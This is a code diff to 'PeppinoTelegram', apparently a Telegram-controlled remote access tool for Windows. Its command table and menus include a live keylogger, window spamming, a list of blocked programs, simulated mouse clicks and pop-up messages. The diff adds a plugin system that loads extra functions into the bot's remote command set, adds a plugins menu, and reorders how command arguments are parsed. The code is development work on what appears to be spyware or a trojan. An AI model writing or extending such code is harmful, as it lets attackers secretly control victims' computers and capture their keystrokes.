@@ -1295,12 +1295,19 @@ class PeppinoTelegram:
             "menu_cantopen":self.menu_cantopen,
             "menu_keylogger":self.menu_keylogger,
             "menu_misc":self.menu_misc,
+            "menu_plugins":self.menu_plugins,
             "leftclick":self.leftclick,
             "rightclick":self.rightclick,
             "nothing":lambda:...,
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
             "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8)
         }
+        self.plugins = self.load_plugins()
+        if self.plugins:
+            function_table_update = {v[0]:v[1] for k,v in self.plugins.items()}
+            self.plugins_buttons = {k:f"{v[0]}" for k,v in self.plugins.items()}
+            self.function_table.update(function_table_update)
+
         self.no_background_functions = [self.message_box, self.spam_windows]
 
     def __play_loaded_sound(self, audio: str, volume=None) -> None:
@@ -1546,6 +1553,10 @@ class PeppinoTelegram:
                     buffer=""
         self.bsend("Live keylogger done")
 
+    def load_plugins(self) -> None:
+        from plugins.plugins import plugins
+        return plugins if plugins else None
+
     def message_box(self, text: str, title: str = "Warning") -> int:
         def run():
             ctypes.windll.user32.MessageBoxW(0, text, title, 0x1000)
@@ -1613,11 +1624,21 @@ class PeppinoTelegram:
             "🔒 Can't Open List": "/menu_cantopen",
             "🧠 Keylogger": "/menu_keylogger",
             "🦑 Misc": "/menu_misc",
+            "🔌 PlugIns": "/menu_plugins",
         }
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
         self.mainmenu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="mainmenu_close", next_btn=True, next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
+
+    def menu_plugins(self):
+        buttons = self.plugins_buttons
+        if buttons:
+            if self.mainmenu_ref:
+                self.mainmenu_ref.delete()
+            self.mainmenu_ref = self.new_menu(buttons, label="🔌 Your Plugins", close_btn_lab="mainmenu_close", next_btn=True, next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
+        else:
+            self.bsend("🔌No plugins loaded")
 
     def menu_system(self):
         buttons = {
@@ -1840,8 +1861,8 @@ class PeppinoTelegram:
         if command.startswith("/"):
             command = args[0][1:]
         function_args = args[1:]
-        function_args = map(lambda x: int(x) if x.isdigit() else x, function_args)
-        function_args = list(map(lambda x:x.replace("<SPACE>"," "), function_args))
+        function_args = map(lambda x:x.replace("<SPACE>"," "), function_args)
+        function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
 
         func = self.function_table.get(command)
         if func:
